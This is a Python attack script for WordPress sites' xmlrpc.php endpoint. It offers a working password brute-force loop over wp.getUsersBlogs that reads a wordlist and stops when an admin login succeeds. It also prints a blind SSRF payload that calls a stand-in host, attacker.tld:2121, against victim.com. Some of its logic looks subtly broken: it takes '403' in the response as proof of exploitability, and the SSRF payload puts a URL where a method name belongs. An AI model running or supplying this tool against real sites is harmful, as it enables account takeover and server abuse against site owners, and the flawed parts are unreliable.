import requests
import pyfiglet

text = "Meentest XMLRPC Exploitation:)"
ascii_art = pyfiglet.figlet_format(text)

print(ascii_art)

url = input("Enter URL: ")
url = url.rstrip('/') + "/xmlrpc.php"

headers = {
    'Content-Type': 'text/xml'
}

response = requests.post(url, headers=headers, data="""<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>

<param><value>admin</value></param>
<param><value>admin</value></param>
</params>
</methodCall>""")

if "403" in response.text:
    print("This site supports XMLRPC and can be exploited.")
    exploit = input("Do you want to exploit it? (yes or no): ")
    if exploit.lower() == "yes":
        exploit_type = input("Select an exploit type:\n1) Brute Force\n2) Blind SSRF\n which one?")
        if exploit_type == "1":
            username = input("Enter username: ")
            password_file = input("Enter password file path: ")
            with open(password_file, "r") as f:
                for password in f.readlines():
                    password = password.strip()
                    payload = """<?xml version="1.0"?>
                    <methodCall>
                    <methodName>wp.getUsersBlogs</methodName>
                    <params>

                    <param><value>{0}</value></param>
                    <param><value>{1}</value></param>
                    </params>
                    </methodCall>
                    """.format(username, password)
                    response = requests.post(url, headers=headers, data=payload)
                    if "isAdmin" in response.text:
                        print("You're logged in! Password: {}".format(password))
                        break
                else:
                    print("Could not find valid password.")
        elif exploit_type == "2":
            print("""<methodCall>
   <methodName>https://attacker.tld:2121</methodName>
  <params>
    <param>
      <value><string>https://victim.com</string></value>
    </param>
    <param>
      <value><string>https://victim.com/everything-about</string></value>
    </param>
  </params>
</methodCall>""")
        else:
            print("Invalid exploit type selected.")
    else:
        print("Exploitation canceled.")
else:
    print("XMLRPC is not supported.")
print("Bye!")
